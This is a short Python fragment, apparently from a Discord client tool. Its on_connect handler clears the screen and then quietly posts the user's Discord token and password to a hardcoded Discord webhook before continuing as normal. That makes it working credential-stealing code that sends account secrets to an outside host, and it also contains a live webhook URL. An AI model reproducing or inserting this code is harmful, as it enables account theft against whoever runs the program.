...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/860431403321917450/QmZqh7boIyYqEgSx67cu7xebyjpTpsXcJBSluyzPlTipaLFy6Jcjnz4vRuFmJzAUCqWr',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()
